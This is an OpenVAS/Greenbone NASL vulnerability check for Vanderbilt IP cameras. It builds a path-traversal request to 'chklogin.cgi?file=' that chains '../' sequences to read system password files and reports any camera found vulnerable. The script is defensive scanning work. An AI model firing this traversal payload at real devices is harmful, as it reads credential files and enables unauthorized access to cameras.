# SPDX-FileCopyrightText: 2016 Greenbone AG
# Some text descriptions might be excerpted from (a) referenced
# source(s), and are Copyright (C) by the respective right holder(s).
#
# SPDX-License-Identifier: GPL-2.0-only

CPE = "cpe:/a:vanderbilt:vanderbilt_ip_camera";

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.807353");
  script_version("2025-04-15T05:54:49+0000");
  script_tag(name:"cvss_base", value:"10.0");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:C/I:C/A:C");
  script_tag(name:"last_modification", value:"2025-04-15 05:54:49 +0000 (Tue, 15 Apr 2025)");
  script_tag(name:"creation_date", value:"2016-08-23 16:18:17 +0530 (Tue, 23 Aug 2016)");
  script_name("Vanderbilt IP-Camera Local File Disclosure and Credential Disclosure Vulnerabilities");

  script_tag(name:"summary", value:"Vanderbilt IP-Camera is prone to local file disclosure and credential disclosure vulnerabilities");

  script_tag(name:"vuldetect", value:"Send the crafted http GET request
  and check whether it is able to read the password file or not.");

  script_tag(name:"insight", value:"Multiple flaws exist due to

  - An improper sanitization of input to 'file' parameter in 'chklogin.cgi'
    and 'check.cgi' scripts.

  - An improper restriction on user access levels for certain pages.");

  script_tag(name:"impact", value:"Successful exploitation will allow a remote
  attacker to read arbitrary files and also to read sensitive information like
  username and password of the device.");

  script_tag(name:"affected", value:"Vanderbilt IP-Camera types CCPW3025-IR,
  CVMW3025-IR.");

  script_tag(name:"solution", value:"According to vendor: these vulnerabilities were closed in the new Firmware Versions
  which you can find for all camera models via the home page. Just search for your model and you will find the latest
  FW.");

  script_tag(name:"solution_type", value:"VendorFix");

  script_tag(name:"qod_type", value:"remote_vul");

  script_xref(name:"URL", value:"https://www.exploit-db.com/exploits/40263");
  script_xref(name:"URL", value:"https://www.exploit-db.com/exploits/40281");

  script_category(ACT_ATTACK);
  script_copyright("Copyright (C) 2016 Greenbone AG");
  script_family("Web application abuses");
  script_dependencies("gb_vanderbilt_ip_camera_detect.nasl", "os_detection.nasl");
  script_mandatory_keys("Vanderbilt/IP_Camera/Installed");
  script_require_ports("Services/www", 443);

  exit(0);
}

include("misc_func.inc");
include("traversal_func.inc");
include("http_func.inc");
include("http_keepalive.inc");
include("host_details.inc");
include("os_func.inc");

if(!vanPort = get_app_port(cpe:CPE)){
  exit(0);
}

if(!dir = get_app_location(cpe:CPE, port:vanPort)){
  exit(0);
}

if(dir == "/"){
  dir = "";
}

files = traversal_files();

foreach file (keys(files))
{
  url = dir + '/chklogin.cgi?file=' + crap(data: "../", length: 3*15) + files[file];

  if(http_vuln_check(port:vanPort, url:url, check_header:TRUE, pattern:file))
  {
    report = http_report_vuln_url(port:vanPort, url:url);
    security_message(port:vanPort, data:report);
    exit(0);
  }
}

exit(99);
